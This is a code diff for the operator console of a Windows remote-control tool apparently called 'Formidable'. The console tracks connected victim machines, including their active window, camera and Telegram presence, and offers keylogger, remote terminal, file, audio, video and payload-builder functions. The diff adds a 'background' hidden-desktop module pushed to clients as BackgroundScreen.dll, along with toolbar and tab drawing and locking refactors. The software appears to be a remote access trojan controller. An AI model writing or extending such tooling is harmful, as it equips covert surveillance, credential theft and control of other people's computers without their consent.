@@ -23,6 +23,7 @@
 #include <commdlg.h>
 #include <ctime>
 #include <fstream>
+#include <gdiplus.h>
 #include "resource.h"
 #include "../Common/ClientTypes.h"
 #include "../Common/Config.h"
@@ -41,6 +42,7 @@
 #include "UI/RegistryDialog.h"
 #include "UI/AudioDialog.h"
 #include "UI/VideoDialog.h"
+#include "UI/BackgroundDialog.h"
 #include "UI/InputDialog.h"
 #include "UI/SettingsDialog.h"
 #include "UI/BuilderDialog.h"
@@ -49,6 +51,131 @@
 
 using namespace Formidable;
 using namespace Formidable::Utils;
+using namespace Gdiplus;
+
+static int s_toolbarHotId = -1;
+
+static Color MakeColor(BYTE a, COLORREF c) {
+    return Color(a, GetRValue(c), GetGValue(c), GetBValue(c));
+}
+
+static void BuildRoundRect(GraphicsPath& path, const RectF& rc, float radius) {
+    float d = radius * 2.0f;
+    path.AddArc(rc.X, rc.Y, d, d, 180.0f, 90.0f);
+    path.AddArc(rc.X + rc.Width - d, rc.Y, d, d, 270.0f, 90.0f);
+    path.AddArc(rc.X + rc.Width - d, rc.Y + rc.Height - d, d, d, 0.0f, 90.0f);
+    path.AddArc(rc.X, rc.Y + rc.Height - d, d, d, 90.0f, 90.0f);
+    path.CloseFigure();
+}
+
+static void FillRoundRect(Graphics& g, const RectF& rc, float radius, const Color& color) {
+    GraphicsPath path;
+    BuildRoundRect(path, rc, radius);
+    SolidBrush brush(color);
+    g.FillPath(&brush, &path);
+}
+
+static std::wstring NormalizeIpText(const std::string& ip) {
+    std::string trimmed = StringHelper::Trim(ip);
+    if (trimmed.empty()) return L"";
+    std::string clean;
+    clean.reserve(trimmed.size());
+    for (unsigned char c : trimmed) {
+        if ((c >= '0' && c <= '9') || c == '.' || c == ':' || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+            clean.push_back((char)c);
+        }
+    }
+    if (!clean.empty()) return UTF8ToWide(clean);
+    return StringHelper::ANSIToWide(trimmed);
+}
+
+static LRESULT HandleToolbarCustomDraw(HWND hToolbar, NMTBCUSTOMDRAW* cd) {
+    if (cd->nmcd.dwDrawStage == CDDS_PREPAINT) {
+        return CDRF_NOTIFYITEMDRAW;
+    }
+    if (cd->nmcd.dwDrawStage == CDDS_ITEMPREPAINT) {
+        HDC hdc = cd->nmcd.hdc;
+        RECT rc = cd->nmcd.rc;
+        Graphics g(hdc);
+        g.SetSmoothingMode(SmoothingModeAntiAlias);
+        COLORREF accent = GetSysColor(COLOR_HIGHLIGHT);
+        bool hot = (cd->nmcd.uItemState & CDIS_HOT) != 0 || (int)cd->nmcd.dwItemSpec == s_toolbarHotId;
+        bool pressed = (cd->nmcd.uItemState & CDIS_SELECTED) != 0;
+        if (hot || pressed) {
+            RectF shadowRect((REAL)rc.left + 1.0f, (REAL)rc.top + 2.0f, (REAL)(rc.right - rc.left - 2), (REAL)(rc.bottom - rc.top - 3));
+            FillRoundRect(g, shadowRect, 8.0f, MakeColor(28, RGB(0, 0, 0)));
+            RectF fillRect((REAL)rc.left + 1.0f, (REAL)rc.top + 1.0f, (REAL)(rc.right - rc.left - 2), (REAL)(rc.bottom - rc.top - 2));
+            FillRoundRect(g, fillRect, 8.0f, MakeColor(pressed ? 70 : 40, accent));
+        }
+        int cmdId = (int)cd->nmcd.dwItemSpec;
+        int index = (int)SendMessageW(hToolbar, TB_COMMANDTOINDEX, cmdId, 0);
+        TBBUTTON btn = { 0 };
+        SendMessageW(hToolbar, TB_GETBUTTON, index, (LPARAM)&btn);
+        HIMAGELIST hImg = (HIMAGELIST)SendMessageW(hToolbar, TB_GETIMAGELIST, 0, 0);
+        int iconSize = 32;
+        int paddingTop = 6;
+        int iconX = rc.left + (rc.right - rc.left - iconSize) / 2;
+        int iconY = rc.top + paddingTop;
+        if (hImg) {
+            ImageList_Draw(hImg, btn.iBitmap, hdc, iconX, iconY, ILD_NORMAL);
+        }
+        wchar_t text[64] = { 0 };
+        SendMessageW(hToolbar, TB_GETBUTTONTEXTW, cmdId, (LPARAM)text);
+        HFONT hFont = (HFONT)SendMessageW(hToolbar, WM_GETFONT, 0, 0);
+        HFONT hOld = (HFONT)SelectObject(hdc, hFont);
+        SetBkMode(hdc, TRANSPARENT);
+        SetTextColor(hdc, GetSysColor(COLOR_BTNTEXT));
+        RECT rcText = rc;
+        rcText.top = iconY + iconSize + 2;
+        DrawTextW(hdc, text, -1, &rcText, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
+        SelectObject(hdc, hOld);
+        return CDRF_SKIPDEFAULT;
+    }
+    return CDRF_DODEFAULT;
+}
+
+static LRESULT HandleTabCustomDraw(HWND hTab, NMCUSTOMDRAW* cd) {
+    if (cd->dwDrawStage == CDDS_PREPAINT) {
+        return CDRF_NOTIFYITEMDRAW;
+    }
+    if (cd->dwDrawStage == CDDS_ITEMPREPAINT) {
+        HDC hdc = cd->hdc;
+        int index = (int)cd->dwItemSpec;
+        RECT rc;
+        TabCtrl_GetItemRect(hTab, index, &rc);
+        Graphics g(hdc);
+        g.SetSmoothingMode(SmoothingModeAntiAlias);
+        COLORREF accent = GetSysColor(COLOR_HIGHLIGHT);
+        int curSel = TabCtrl_GetCurSel(hTab);
+        POINT pt;
+        GetCursorPos(&pt);
+        ScreenToClient(hTab, &pt);
+        TCHITTESTINFO ht = { 0 };
+        ht.pt = pt;
+        int hotIndex = TabCtrl_HitTest(hTab, &ht);
+        bool hot = hotIndex == index;
+        bool selected = curSel == index;
+        RectF fillRect((REAL)rc.left + 1.0f, (REAL)rc.top + 2.0f, (REAL)(rc.right - rc.left - 2), (REAL)(rc.bottom - rc.top - 3));
+        if (hot || selected) {
+            FillRoundRect(g, fillRect, 8.0f, MakeColor(selected ? 55 : 30, accent));
+        }
+        wchar_t text[128] = { 0 };
+        TCITEMW item = { 0 };
+        item.mask = TCIF_TEXT;
+        item.pszText = text;
+        item.cchTextMax = 128;
+        TabCtrl_GetItem(hTab, index, &item);
+        HFONT hFont = (HFONT)SendMessageW(hTab, WM_GETFONT, 0, 0);
+        HFONT hOld = (HFONT)SelectObject(hdc, hFont);
+        SetBkMode(hdc, TRANSPARENT);
+        SetTextColor(hdc, GetSysColor(COLOR_BTNTEXT));
+        RECT rcText = rc;
+        DrawTextW(hdc, text, -1, &rcText, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
+        SelectObject(hdc, hOld);
+        return CDRF_SKIPDEFAULT;
+    }
+    return CDRF_DODEFAULT;
+}
 
 // 从main_gui.cpp提取：菜单创建
 void CreateMainMenu(HWND hWnd) {
@@ -101,23 +228,23 @@ void CreateMainToolbar(HWND hWnd) {
     SendMessage(g_hToolbar, TB_SETIMAGELIST, 0, (LPARAM)hImageList);
     
     int iconIds[] = {
-        IDI_TERMINAL, IDI_PROCESS, IDI_NETWORK, IDI_WINDOW, IDI_DESKTOP, IDI_FILE,
+        IDI_TERMINAL, IDI_PROCESS, IDI_NETWORK, IDI_WINDOW, IDI_DESKTOP, IDI_DESKTOP, IDI_FILE,
         IDI_AUDIO, IDI_VIDEO, IDI_SERVICE, IDI_REGISTRY, IDI_KEYLOGGER,
         IDI_SETTINGS, IDI_HISTORY, IDI_BUILDER, IDI_HELP
     };
 
     const wchar_t* buttonTexts[] = {
-        L"终端", L"进程", L"网络", L"窗口", L"桌面", L"文件",
+        L"终端", L"进程", L"网络", L"窗口", L"桌面", L"后台", L"文件",
         L"语音", L"视频", L"服务", L"注册表", L"键盘记录",
         L"设置", L"历史主机", L"生成", L"帮助"
     };
     int ids[] = {
-        IDM_TERMINAL, IDM_PROCESS, IDM_NETWORK, IDM_WINDOW, IDM_DESKTOP, IDM_FILE,
+        IDM_TERMINAL, IDM_PROCESS, IDM_NETWORK, IDM_WINDOW, IDM_DESKTOP, IDM_BACKGROUND, IDM_FILE,
         IDM_AUDIO, IDM_VIDEO, IDM_SERVICE, IDM_REGISTRY, IDM_KEYLOGGER,
         IDM_SETTINGS, IDM_EXTEND_HISTORY, IDM_BUILDER, IDM_HELP
     };
 
-    for (int i = 0; i < 15; i++) {
+    for (int i = 0; i < 16; i++) {
         HICON hIcon = (HICON)LoadImageW(g_hInstance, MAKEINTRESOURCEW(iconIds[i]), IMAGE_ICON, 32, 32, LR_DEFAULTCOLOR);
         if (hIcon) {
             ImageList_AddIcon(hImageList, hIcon);
@@ -125,8 +252,8 @@ void CreateMainToolbar(HWND hWnd) {
         }
     }
 
-    TBBUTTON tbButtons[15];
-    for (int i = 0; i < 15; i++) {
+    TBBUTTON tbButtons[16];
+    for (int i = 0; i < 16; i++) {
         ZeroMemory(&tbButtons[i], sizeof(TBBUTTON));
         tbButtons[i].iBitmap = i;
         tbButtons[i].idCommand = ids[i];
@@ -134,7 +261,7 @@ void CreateMainToolbar(HWND hWnd) {
         tbButtons[i].fsStyle = BTNS_AUTOSIZE | BTNS_SHOWTEXT;
         tbButtons[i].iString = (INT_PTR)buttonTexts[i];
     }
-    SendMessage(g_hToolbar, TB_ADDBUTTONS, 15, (LPARAM)&tbButtons);
+    SendMessage(g_hToolbar, TB_ADDBUTTONS, 16, (LPARAM)&tbButtons);
     SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
 }
 
@@ -143,57 +270,88 @@ void LoadListData(const std::string& group) {
     SendMessageW(g_hListClients, WM_SETREDRAW, FALSE, 0);
     ListView_DeleteAllItems(g_hListClients);
     
-    std::lock_guard<std::mutex> lock(g_ClientsMutex);
+    struct ClientSnapshot {
+        uint32_t clientId;
+        uint16_t port;
+        std::string ip;
+        std::wstring group;
+        std::wstring remark;
+        Formidable::ClientInfo info;
+    };
+    std::vector<ClientSnapshot> snapshots;
+    snapshots.reserve(g_Clients.size());
+
+    bool isDefaultGroup = (group == "default" || group == "默认");
+    {
+        std::lock_guard<std::mutex> lock(g_ClientsMutex);
+        for (auto& pair : g_Clients) {
+            auto& client = pair.second;
+            std::string clientGroup = WideToUTF8(client->group);
+            bool isClientDefault = (clientGroup.empty() || clientGroup == "default" || clientGroup == "默认");
+            if (!((isDefaultGroup && isClientDefault) || clientGroup == group)) {
+                continue;
+            }
+            ClientSnapshot snap = {};
+            snap.clientId = client->clientId;
+            snap.port = client->port;
+            snap.ip = client->ip;
+            snap.group = client->group;
+            snap.remark = client->remark;
+            snap.info = client->info;
+            snapshots.push_back(std::move(snap));
+        }
+    }
+
     int iCount = 0;
-    for (auto& pair : g_Clients) {
-        auto& client = pair.second;
-        std::string clientGroup = WideToUTF8(client->group);
-        
-        bool isDefaultGroup = (group == "default" || group == "默认");
-        bool isClientDefault = (clientGroup.empty() || clientGroup == "default" || clientGroup == "默认");
-        
-        if ((isDefaultGroup && isClientDefault) || clientGroup == group) {
-            LVITEMW lvi = { 0 };
-            lvi.mask = LVIF_TEXT | LVIF_PARAM;
-            lvi.iItem = iCount;
-            lvi.lParam = (LPARAM)client->clientId;
-            std::wstring wip = UTF8ToWide(client->ip);
-            lvi.pszText = (LPWSTR)wip.c_str();
-            int index = ListView_InsertItem(g_hListClients, &lvi);
-            
-            client->listIndex = index; // 更新 listIndex
+    std::vector<std::pair<uint32_t, int>> listIndexUpdates;
+    listIndexUpdates.reserve(snapshots.size());
+    for (auto& snap : snapshots) {
+        LVITEMW lvi = { 0 };
+        lvi.mask = LVIF_TEXT | LVIF_PARAM;
+        lvi.iItem = iCount;
+        lvi.lParam = (LPARAM)snap.clientId;
+        std::wstring wip = NormalizeIpText(snap.ip);
+        lvi.pszText = (LPWSTR)wip.c_str();
+        int index = ListView_InsertItem(g_hListClients, &lvi);
+        listIndexUpdates.push_back(std::make_pair(snap.clientId, index));
 
-            // 设置其他列数据
-            std::wstring wPort = std::to_wstring(client->port);
-            std::wstring wLAN = Utils::StringHelper::UTF8ToWide(client->info.lanAddr);
-            std::wstring wComp = Utils::StringHelper::UTF8ToWide(client->info.computerName);
-            std::wstring wUserGroup = Utils::StringHelper::UTF8ToWide(client->info.userName) + L"/" + client->info.group;
-            std::wstring wOS = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
-            std::wstring wRTT = std::to_wstring(client->info.rtt) + L"ms";
-            std::wstring wVer = Utils::StringHelper::UTF8ToWide(client->info.version);
-            std::wstring wInst = Utils::StringHelper::UTF8ToWide(client->info.installTime);
-            std::wstring wUptime = Utils::StringHelper::UTF8ToWide(client->info.uptime);
-            std::wstring wActWin = Utils::StringHelper::UTF8ToWide(client->info.activeWindow);
+        std::wstring wPort = std::to_wstring(snap.port);
+        std::wstring wLAN = Utils::StringHelper::UTF8ToWide(snap.info.lanAddr);
+        std::wstring wComp = Utils::StringHelper::UTF8ToWide(snap.info.computerName);
+        std::wstring wUserGroup = Utils::StringHelper::UTF8ToWide(snap.info.userName) + L"/" + snap.info.group;
+        std::wstring wOS = Utils::StringHelper::UTF8ToWide(snap.info.osVersion);
+        std::wstring wRTT = std::to_wstring(snap.info.rtt) + L"ms";
+        std::wstring wVer = Utils::StringHelper::UTF8ToWide(snap.info.version);
+        std::wstring wInst = Utils::StringHelper::UTF8ToWide(snap.info.installTime);
+        std::wstring wUptime = Utils::StringHelper::UTF8ToWide(snap.info.uptime);
+        std::wstring wActWin = Utils::StringHelper::UTF8ToWide(snap.info.activeWindow);
 
-            ListView_SetItemText(g_hListClients, index, 1, (LPWSTR)wPort.c_str());
-            ListView_SetItemText(g_hListClients, index, 2, (LPWSTR)L"正在获取..."); // 地理位置由异步更新
-            ListView_SetItemText(g_hListClients, index, 3, (LPWSTR)wLAN.c_str());
-            ListView_SetItemText(g_hListClients, index, 4, (LPWSTR)wComp.c_str());
-            ListView_SetItemText(g_hListClients, index, 5, (LPWSTR)wUserGroup.c_str());
-            ListView_SetItemText(g_hListClients, index, 6, (LPWSTR)wOS.c_str());
-            ListView_SetItemText(g_hListClients, index, 7, (LPWSTR)wRTT.c_str());
-            ListView_SetItemText(g_hListClients, index, 8, (LPWSTR)wVer.c_str());
-            ListView_SetItemText(g_hListClients, index, 9, (LPWSTR)wInst.c_str());
-            ListView_SetItemText(g_hListClients, index, 10, (LPWSTR)wUptime.c_str());
-            ListView_SetItemText(g_hListClients, index, 11, (LPWSTR)wActWin.c_str());
-            ListView_SetItemText(g_hListClients, index, 12, (LPWSTR)client->remark.c_str());
+        ListView_SetItemText(g_hListClients, index, 1, (LPWSTR)wPort.c_str());
+        ListView_SetItemText(g_hListClients, index, 2, (LPWSTR)L"正在获取...");
+        ListView_SetItemText(g_hListClients, index, 3, (LPWSTR)wLAN.c_str());
+        ListView_SetItemText(g_hListClients, index, 4, (LPWSTR)wComp.c_str());
+        ListView_SetItemText(g_hListClients, index, 5, (LPWSTR)wUserGroup.c_str());
+        ListView_SetItemText(g_hListClients, index, 6, (LPWSTR)wOS.c_str());
+        ListView_SetItemText(g_hListClients, index, 7, (LPWSTR)wRTT.c_str());
+        ListView_SetItemText(g_hListClients, index, 8, (LPWSTR)wVer.c_str());
+        ListView_SetItemText(g_hListClients, index, 9, (LPWSTR)wInst.c_str());
+        ListView_SetItemText(g_hListClients, index, 10, (LPWSTR)wUptime.c_str());
+        ListView_SetItemText(g_hListClients, index, 11, (LPWSTR)wActWin.c_str());
+        ListView_SetItemText(g_hListClients, index, 12, (LPWSTR)snap.remark.c_str());
 
-            std::wstring wCamera = client->info.hasCamera ? L"是" : L"否";
-            std::wstring wTelegram = client->info.hasTelegram ? L"是" : L"否";
-            ListView_SetItemText(g_hListClients, index, 13, (LPWSTR)wCamera.c_str());
-            ListView_SetItemText(g_hListClients, index, 14, (LPWSTR)wTelegram.c_str());
-            
-            iCount++;
+        std::wstring wCamera = snap.info.hasCamera ? L"是" : L"否";
+        std::wstring wTelegram = snap.info.hasTelegram ? L"是" : L"否";
+        ListView_SetItemText(g_hListClients, index, 13, (LPWSTR)wCamera.c_str());
+        ListView_SetItemText(g_hListClients, index, 14, (LPWSTR)wTelegram.c_str());
+        iCount++;
+    }
+
+    if (!listIndexUpdates.empty()) {
+        std::lock_guard<std::mutex> lock(g_ClientsMutex);
+        for (auto& entry : listIndexUpdates) {
+            if (g_Clients.count(entry.first)) {
+                g_Clients[entry.first]->listIndex = entry.second;
+            }
         }
     }
     
@@ -203,11 +361,11 @@ void LoadListData(const std::string& group) {
 
 // 从main_gui.cpp提取：状态栏更新
 void UpdateStatusBar() {
-    int totalClients = (int)g_Clients.size();
+    int totalClients = 0;
     int activeClients = 0;
-    
     {
         std::lock_guard<std::mutex> lock(g_ClientsMutex);
+        totalClients = (int)g_Clients.size();
         for (const auto& pair : g_Clients) {
             if (pair.second->active) activeClients++;
         }
@@ -550,7 +708,7 @@ void HandleCommand(HWND hWnd, int id) {
                     if (client->hFileDlg) ShowWindow(client->hFileDlg, SW_SHOW);
                     
                     AddLog(L"操作", L"打开文件管理...");
-                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"FileManager.dll", CMD_FILE_LIST);
+                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"FileManager.dll", CMD_DRIVE_LIST);
                 }
             }
         }
@@ -652,6 +810,28 @@ void HandleCommand(HWND hWnd, int id) {
                     
                     AddLog(L"操作", L"打开服务管理...");
                     SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ServiceManager.dll", CMD_SERVICE_LIST);
+                }
+            }
+        }
+        break;
+    case IDM_BACKGROUND:
+        {
+            std::shared_ptr<Formidable::ConnectedClient> client;
+            {
+                std::lock_guard<std::mutex> lock(g_ClientsMutex);
+                if (g_Clients.count(clientId)) client = g_Clients[clientId];
+            }
+            if (client) {
+                if (client->hBackgroundDlg && IsWindow(client->hBackgroundDlg)) {
+                    ShowWindow(client->hBackgroundDlg, SW_SHOW);
+                    SetForegroundWindow(client->hBackgroundDlg);
+                } else {
+                    client->hBackgroundDlg = UI::BackgroundDialog::Show(hWnd, clientId);
+                    if (client->hBackgroundDlg) ShowWindow(client->hBackgroundDlg, SW_SHOW);
+                    
+                    AddLog(L"操作", L"打开后台桌面...");
+                    // 启动模块
+                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"BackgroundScreen.dll", CMD_BACKGROUND_CREATE);
                 }
             }
         }
@@ -791,13 +971,18 @@ void HandleCommand(HWND hWnd, int id) {
                         
                         std::string groupUtf8 = WideToUTF8(groupName);
                         
-                        std::lock_guard<std::mutex> lock(g_ClientsMutex);
+                        std::vector<uint32_t> updateClients;
+                        {
+                            std::lock_guard<std::mutex> lock(g_ClientsMutex);
                         for (auto cid : selectedClients) {
                             if (g_Clients.count(cid)) {
                                 g_Clients[cid]->group = groupName;
-                                // 发送设置分组命令到客户端
-                                SendSimpleCommand(cid, CMD_SET_GROUP, 0, 0, groupUtf8);
+                                updateClients.push_back(cid);
                             }
+                        }
+                        }
+                        for (auto cid : updateClients) {
+                            SendSimpleCommand(cid, CMD_SET_GROUP, 0, 0, groupUtf8);
                         }
                         
                         // 如果是新分组，添加到Tab
@@ -991,15 +1176,24 @@ void HandleCommand(HWND hWnd, int id) {
             }
             
             std::string newGroupUtf8 = WideToUTF8(newName);
+            if (g_GroupList.find(newGroupUtf8) != g_GroupList.end()) {
+                MessageBoxW(hWnd, L"分组名称已存在!", L"提示", MB_OK | MB_ICONWARNING);
+                break;
+            }
             
             // 更新所有属于该分组的客户端
-            std::lock_guard<std::mutex> lock(g_ClientsMutex);
-            for (auto& pair : g_Clients) {
-                if (WideToUTF8(pair.second->group) == g_selectedGroup) {
-                    pair.second->group = newName;
-                    // 发送命令到客户端更新分组
-                    SendSimpleCommand(pair.first, CMD_SET_GROUP, 0, 0, newGroupUtf8);
+            std::vector<uint32_t> updateClients;
+            {
+                std::lock_guard<std::mutex> lock(g_ClientsMutex);
+                for (auto& pair : g_Clients) {
+                    if (WideToUTF8(pair.second->group) == g_selectedGroup) {
+                        pair.second->group = newName;
+                        updateClients.push_back(pair.first);
+                    }
                 }
+            }
+            for (auto cid : updateClients) {
+                SendSimpleCommand(cid, CMD_SET_GROUP, 0, 0, newGroupUtf8);
             }
             
             // 更新分组列表和Tab
@@ -1030,14 +1224,19 @@ void HandleCommand(HWND hWnd, int id) {
         }
         
         // 将该分组下的所有客户端移到默认分组
-        std::lock_guard<std::mutex> lock(g_ClientsMutex);
-        for (auto& pair : g_Clients) {
-            if (WideToUTF8(pair.second->group) == g_selectedGroup) {
-                pair.second->group = L"";
-                // 发送命令到客户端清除分组
-                std::string emptyGroup;
-                SendSimpleCommand(pair.first, CMD_SET_GROUP, 0, 0, emptyGroup);
+        std::vector<uint32_t> updateClients;
+        {
+            std::lock_guard<std::mutex> lock(g_ClientsMutex);
+            for (auto& pair : g_Clients) {
+                if (WideToUTF8(pair.second->group) == g_selectedGroup) {
+                    pair.second->group = L"";
+                    updateClients.push_back(pair.first);
+                }
             }
+        }
+        std::string emptyGroup;
+        for (auto cid : updateClients) {
+            SendSimpleCommand(cid, CMD_SET_GROUP, 0, 0, emptyGroup);
         }
         
         // 删除Tab
@@ -1268,16 +1467,16 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
         int tabHeight = 25;
         int logHeight = 150;
         int margin = 8;
-        int remainHeight = height - toolbarHeight - statusHeight - tabHeight - margin * 3;
+        int remainHeight = height - toolbarHeight - statusHeight - tabHeight - margin * 4;
         
         MoveWindow(g_hToolbar, 0, 0, width, toolbarHeight, TRUE);
-        MoveWindow(g_hGroupTab, 0, toolbarHeight, width, tabHeight, TRUE);
-        int contentTop = toolbarHeight + tabHeight + margin;
+        int contentTop = toolbarHeight + margin;
         int listWidth = width - margin * 2;
         int clientHeight = remainHeight - logHeight;
         if (clientHeight < 0) clientHeight = 0;
         MoveWindow(g_hListClients, margin, contentTop, listWidth, clientHeight, TRUE);
-        MoveWindow(g_hListLogs, margin, contentTop + clientHeight + margin, listWidth, logHeight, TRUE);
+        MoveWindow(g_hGroupTab, margin, contentTop + clientHeight + margin, listWidth, tabHeight, TRUE);
+        MoveWindow(g_hListLogs, margin, contentTop + clientHeight + margin + tabHeight + margin, listWidth, logHeight, TRUE);
         SendMessage(g_hStatusBar, WM_SIZE, 0, 0);
         break;
     }
@@ -1287,6 +1486,18 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
     }
     case WM_NOTIFY: {
         LPNMHDR nm = (LPNMHDR)lParam;
+
+        if (nm->idFrom == IDC_TOOLBAR) {
+            if (nm->code == TBN_HOTITEMCHANGE) {
+                NMTBHOTITEM* hot = (NMTBHOTITEM*)lParam;
+                s_toolbarHotId = hot->idNew;
+                InvalidateRect(g_hToolbar, NULL, TRUE);
+                return 0;
+            }
+            if (nm->code == NM_CUSTOMDRAW) {
+                return HandleToolbarCustomDraw(g_hToolbar, (NMTBCUSTOMDRAW*)lParam);
+            }
+        }
         
         // 处理Tab控件通知
         if (nm->idFrom == IDC_GROUP_TAB) {
@@ -1303,6 +1514,8 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
                     g_selectedGroup = WideToUTF8(szText);
                     LoadListData(g_selectedGroup);
                 }
+            } else if (nm->code == NM_CUSTOMDRAW) {
+                return HandleTabCustomDraw(g_hGroupTab, (NMCUSTOMDRAW*)lParam);
             } else if (nm->code == NM_RCLICK) {
                 // Tab右键菜单
                 POINT pt;
